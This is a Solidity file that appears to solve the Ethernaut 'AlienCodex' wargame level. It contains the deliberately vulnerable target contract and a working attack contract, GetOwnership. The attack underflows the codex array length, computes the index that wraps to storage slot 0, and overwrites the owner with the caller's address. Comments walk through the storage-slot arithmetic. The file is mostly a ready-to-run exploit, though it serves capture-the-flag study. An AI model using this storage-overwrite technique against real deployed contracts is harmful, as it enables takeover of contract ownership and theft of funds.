// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

// import "../helpers/Ownable-05.sol";

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.1/contracts/ownership/Ownable.sol";

import "hardhat/console.sol";

contract AlienCodex is Ownable {
  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }

  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) public contacted {
    codex.push(_content);
  }

  function retract() public contacted {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) public contacted {
    codex[i] = _content;
  }
}

contract GetOwnership {
  function calcIdx() public pure returns (uint) {
    console.logBytes(abi.encode(1));
    console.logBytes32(keccak256(abi.encode(1)));
    console.log(uint(keccak256(abi.encode(1))));
    // ((2 ** 256) - 1) will be the last storage space
    // the idx=0 pos in the array will be keccak256(abi.encode(1)) cuz the array is defined in the storage 1
    // the last storage possition will correspond with the ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) index
    // so just adding one to that idx will correspond to the storage at 0
    // ? can check that adding 2 will correspond to the storage at 1 (the array lenght)
    return ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
  }

  function setMeAsOwner(address ctr) public {
    AlienCodex(ctr).makeContact();
    // decrease the codex length (will underflow)
    AlienCodex(ctr).retract();
    // set my address in the slot 0 of the storage
    AlienCodex(ctr).revise(calcIdx(), bytes32(uint256(uint160(tx.origin))));
  }
}
